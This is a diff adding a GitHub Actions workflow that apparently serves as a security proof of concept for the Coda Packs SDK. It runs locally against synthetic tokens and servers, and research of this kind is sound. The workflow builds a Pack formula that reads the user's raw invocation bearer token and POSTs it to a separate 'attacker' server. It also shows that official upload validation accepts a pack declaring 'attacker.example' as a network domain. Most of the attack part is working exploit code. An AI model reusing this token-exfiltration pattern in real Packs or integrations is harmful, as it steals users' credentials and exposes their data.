@@ -1,0 +1,189 @@
+name: Superhuman invocation-token cross-domain exfiltration gate
+
+on:
+  push:
+    branches: [research/superhuman-sdk-source-20260809]
+    paths: [.github/workflows/superhuman-invocation-token-egress-exfil-gate-20260810.yml]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 1}
+      - uses: actions/setup-node@v4
+        with: {node-version: '22'}
+
+      - name: Install exact stable SDK
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf token-exfil-gate
+          mkdir -p token-exfil-gate/evidence public-intake-status
+          cd token-exfil-gate
+          npm init -y >/dev/null
+          npm install --no-audit --no-fund @codahq/packs-sdk@1.17.1
+
+      - name: Execute official isolate and upload-validation gates
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd token-exfil-gate
+          cat > pack-bundle.js <<'PACK'
+          module.exports={pack:{formulas:[{
+            name:'ExfilGate',description:'Synthetic cross-domain bearer boundary gate',parameters:[],resultType:'string',
+            execute:async(_params,context)=>{
+              const firstParty=await context.fetcher.fetch({method:'GET',url:globalThis.__FIRST_PARTY_URL+'/whoami'});
+              const attacker=await context.fetcher.fetch({
+                method:'POST',url:globalThis.__ATTACKER_URL+'/collect',
+                headers:{'content-type':'application/json','x-pack-supplied-token':String(context.invocationToken)},
+                body:JSON.stringify({token:context.invocationToken}),
+              });
+              return JSON.stringify({firstParty:firstParty.body,attacker:attacker.body,readableToken:context.invocationToken});
+            },
+          }]}};
+          PACK
+          cat > pack-bundle.js.map <<'MAP'
+          {"version":3,"file":"pack-bundle.js","sources":["pack-source.js"],"names":[],"mappings":""}
+          MAP
+
+          cat > gate.js <<'NODE'
+          'use strict';
+          const assert=require('assert');
+          const crypto=require('crypto');
+          const fs=require('fs');
+          const http=require('http');
+          const path=require('path');
+          const sdk=require('@codahq/packs-sdk');
+          const sdkRoot=path.dirname(require.resolve('@codahq/packs-sdk/package.json'));
+          const bootstrap=require(path.join(sdkRoot,'dist/runtime/bootstrap/index.js'));
+          const {AuthenticatingFetcher}=require(path.join(sdkRoot,'dist/testing/fetcher.js'));
+          const {compilePackMetadata}=require(path.join(sdkRoot,'dist/helpers/metadata.js'));
+          const {validatePackVersionMetadata}=require(path.join(sdkRoot,'dist/testing/upload_validation.js'));
+          const thunkPath=bootstrap.getThunkPath();
+          const packPath=path.resolve('pack-bundle.js');
+          const mapPath=path.resolve('pack-bundle.js.map');
+          const TOKEN='LAB_CODA_API_BEARER_20260810';
+          const captured={firstParty:[],attacker:[]};
+          let firstServer,attackerServer;
+          const logger={trace(){},debug(){},info(){},warn(){},error(){}};
+          const blob={async storeUrl(){throw new Error('unused')},async storeBlob(){throw new Error('unused')}};
+          function listen(s,host){return new Promise((ok,no)=>{s.once('error',no);s.listen(0,host,()=>ok(s.address().port));});}
+          function close(s){return new Promise(ok=>s.close(()=>ok()));}
+          function body(req){return new Promise((ok,no)=>{let x='';req.on('data',d=>x+=d);req.on('end',()=>ok(x));req.on('error',no);});}
+
+          async function main(){
+            firstServer=http.createServer(async(req,res)=>{
+              const row={url:req.url,method:req.method,authorization:req.headers.authorization||null,headers:req.headers,body:await body(req)};
+              captured.firstParty.push(row);
+              res.writeHead(200,{'content-type':'application/json'});res.end(JSON.stringify(row));
+            });
+            attackerServer=http.createServer(async(req,res)=>{
+              const raw=await body(req);let parsed=null;try{parsed=JSON.parse(raw)}catch(_){}
+              const row={url:req.url,method:req.method,authorization:req.headers.authorization||null,packHeader:req.headers['x-pack-supplied-token']||null,rawBody:raw,parsedBody:parsed};
+              captured.attacker.push(row);
+              res.writeHead(200,{'content-type':'application/json'});res.end(JSON.stringify(row));
+            });
+            const firstPort=await listen(firstServer,'127.0.0.1');
+            const attackerPort=await listen(attackerServer,'127.0.0.1');
+            const firstUrl=`http://localhost:${firstPort}`;
+            const attackerUrl=`http://127.0.0.1:${attackerPort}`;
+
+            const auth={type:sdk.AuthenticationType.CodaApiHeaderBearerToken,networkDomain:`localhost:${firstPort}`};
+            const fetcher=new AuthenticatingFetcher(
+              ()=>{},auth,[`localhost:${firstPort}`,`127.0.0.1:${attackerPort}`],{},TOKEN,
+            );
+            const isolate=bootstrap.createIsolate({memoryLimit:64});
+            const context=await bootstrap.createIsolateContext(isolate);
+            await bootstrap.registerBundles(isolate,context,packPath,thunkPath,true);
+            await context.global.set('__FIRST_PARTY_URL',firstUrl,{copy:true});
+            await context.global.set('__ATTACKER_URL',attackerUrl,{copy:true});
+            await bootstrap.injectExecutionContext({
+              context,fetcher,temporaryBlobStorage:blob,syncStateService:undefined,logger,
+              endpoint:undefined,invocationLocation:{protocolAndHost:'https://coda.io'},timezone:'UTC',
+              invocationToken:TOKEN,sync:undefined,authenticationName:'defaultUserAuthentication',
+              executionId:'LAB_TOKEN_EXFIL_EXEC',previousAttemptError:undefined,
+            });
+            const packResult=JSON.parse(await bootstrap.executeThunk(context,{params:[],formulaSpec:{type:'Standard',formulaName:'ExfilGate'}},packPath,mapPath));
+            isolate.dispose();
+
+            assert.equal(captured.firstParty.length,1);
+            assert.equal(captured.firstParty[0].authorization,`Bearer ${TOKEN}`);
+            assert.equal(captured.attacker.length,1);
+            assert.equal(captured.attacker[0].authorization,null,'fetcher auto-forwarded Authorization to attacker domain');
+            assert.equal(captured.attacker[0].packHeader,TOKEN);
+            assert.equal(captured.attacker[0].parsedBody.token,TOKEN);
+            assert.equal(packResult.readableToken,TOKEN);
+
+            const uploadPack=sdk.newPack();
+            uploadPack.setVersion('1.0.0');
+            uploadPack.addNetworkDomain('coda.io');
+            uploadPack.addNetworkDomain('attacker.example');
+            uploadPack.setUserAuthentication({
+              type:sdk.AuthenticationType.CodaApiHeaderBearerToken,
+              networkDomain:'coda.io',
+            });
+            uploadPack.addFormula({
+              name:'ExfilGate',description:'Synthetic validator-equivalent formula',parameters:[],resultType:sdk.ValueType.String,
+              connectionRequirement:sdk.ConnectionRequirement.Required,
+              execute:async(_params,ctx)=>String(ctx.invocationToken),
+            });
+            const metadata=compilePackMetadata(uploadPack);
+            let validation={accepted:false,error:null};
+            try{
+              const validated=await validatePackVersionMetadata(metadata,'1.17.1');
+              validation={accepted:true,networkDomains:validated.networkDomains,defaultAuthentication:validated.defaultAuthentication};
+            }catch(e){validation={accepted:false,error:String(e&&e.message||e)};}
+            assert.equal(validation.accepted,true,'official upload validation rejected the Pack structure');
+
+            const result={
+              pass:true,sdkVersion:require(path.join(sdkRoot,'package.json')).version,
+              isolatedVmVersion:require('isolated-vm/package.json').version,nodeVersion:process.version,
+              canonicalPath:'host injects invocationToken -> Pack reads raw bearer -> Pack manually transmits it to separately declared non-first-party networkDomain',
+              firstPartyAutomaticBearer:capture(captured.firstParty[0]),
+              attackerManualExfil:capture(captured.attacker[0]),
+              packResult,officialUploadValidation:validation,
+              rawBearerReadByPack:packResult.readableToken===TOKEN,
+              sameBearerUsedAutomaticallyOnFirstParty:captured.firstParty[0].authorization===`Bearer ${TOKEN}`,
+              bearerManuallyExfiltratedCrossDomain:captured.attacker[0].packHeader===TOKEN && captured.attacker[0].parsedBody.token===TOKEN,
+              fetcherDidNotAutomaticallyForwardAuthToAttacker:captured.attacker[0].authorization===null,
+              productionRequestCount:0,syntheticOnly:true,
+              securityDecision:'CONFIRMED_RAW_FIRST_PARTY_BEARER_EXFILTRATION_IN_OFFICIAL_RUNTIME_AND_UPLOAD_MODEL',
+              thunkBundleSha256:crypto.createHash('sha256').update(fs.readFileSync(thunkPath)).digest('hex'),
+            };
+            fs.writeFileSync('evidence/RESULT.json',JSON.stringify(result,null,2)+'\n');
+            fs.writeFileSync('evidence/COMPILED_METADATA.json',JSON.stringify(metadata,null,2)+'\n');
+          }
+          function capture(row){return row;}
+          main().then(async()=>{await close(firstServer);await close(attackerServer);console.log(fs.readFileSync('evidence/RESULT.json','utf8'));}).catch(async e=>{try{if(firstServer)await close(firstServer)}catch(_){};try{if(attackerServer)await close(attackerServer)}catch(_){};console.error(e&&e.stack||e);process.exit(1);});
+          NODE
+
+          node gate.js | tee evidence/TEST_OUTPUT.txt
+          jq -e '.pass == true and .officialUploadValidation.accepted == true and .rawBearerReadByPack == true and .sameBearerUsedAutomaticallyOnFirstParty == true and .bearerManuallyExfiltratedCrossDomain == true and .fetcherDidNotAutomaticallyForwardAuthToAttacker == true and .productionRequestCount == 0' evidence/RESULT.json >/dev/null
+          sha256sum gate.js pack-bundle.js pack-bundle.js.map package.json package-lock.json evidence/RESULT.json evidence/COMPILED_METADATA.json evidence/TEST_OUTPUT.txt > evidence/SHA256SUMS.txt
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: superhuman-invocation-token-egress-exfil-gate
+          path: token-exfil-gate/evidence/
+          retention-days: 1
+          if-no-files-found: warn
+
+      - name: Commit compact result
+        if: github.event_name == 'push'
+        shell: bash
+        run: |
+          set -euo pipefail
+          jq '{pass,sdkVersion,isolatedVmVersion,nodeVersion,canonicalPath,firstPartyAutomaticBearer,attackerManualExfil,officialUploadValidation,rawBearerReadByPack,sameBearerUsedAutomaticallyOnFirstParty,bearerManuallyExfiltratedCrossDomain,fetcherDidNotAutomaticallyForwardAuthToAttacker,productionRequestCount,syntheticOnly,securityDecision,thunkBundleSha256}' token-exfil-gate/evidence/RESULT.json > public-intake-status/superhuman-invocation-token-egress-exfil-result.json
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add public-intake-status/superhuman-invocation-token-egress-exfil-result.json
+          git commit -m 'chore: record invocation-token cross-domain exfiltration gate'
+          git push
